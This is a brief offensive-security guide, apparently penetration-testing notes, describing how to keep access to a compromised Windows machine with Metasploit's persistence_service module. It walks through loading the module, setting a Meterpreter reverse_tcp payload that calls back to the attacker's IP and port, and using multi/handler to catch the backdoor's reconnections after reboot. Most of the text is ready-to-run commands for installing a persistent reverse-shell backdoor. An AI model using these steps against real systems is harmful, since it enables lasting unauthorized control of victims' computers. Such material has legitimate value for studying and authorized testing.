
Persistence is a key post-exploitation step that allows an attacker to maintain access to a compromised system even after it has been rebooted or the initial session has been closed.

## Metasploit

1. Gain a Meterpreter session on the target machine 
2. Load the `persistence_service` module
```bash
use exploit/windows/local/persistence_service
```

3. Set Required Options

- `SESSION`: The session ID of the active Meterpreter session.
- `PAYLOAD`: The payload you want to execute persistently (e.g., `windows/meterpreter/reverse_tcp`).
- `LHOST`: The attacker's IP address to receive the connection.
- `LPORT`: The port on which the listener will be running.

4. Run the module

#### Recovering Access After Using the Persistence Module
After deploying the persistence module in Metasploit, if the session ends unexpectedly (due to reboot or network loss), you can regain access using the `multi/handler` module. The backdoor created by the module ensures that the payload will reconnect to the attacker's machine whenever executed on the target.
```bash
use multi/handler
set payload <payload_type>       
set LHOST <attacker_ip>         
set LPORT <listening_port>       
exploit
```